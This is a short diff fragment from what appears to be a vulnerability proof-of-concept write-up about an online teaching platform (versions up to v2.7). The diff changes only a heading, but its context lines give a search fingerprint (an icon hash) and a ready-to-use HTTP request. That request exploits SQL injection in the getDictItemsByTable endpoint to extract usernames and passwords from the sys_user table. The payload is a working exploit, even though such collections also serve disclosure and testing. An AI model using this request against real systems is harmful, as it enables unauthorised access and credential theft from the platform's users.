@@ -8,7 +8,7 @@ Teaching 在线教学平台 <= v2.7版本存在SQL注入漏洞，攻击者利用
 icon_hash="1778610975"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/username,password%20'/x.js HTTP/1.1
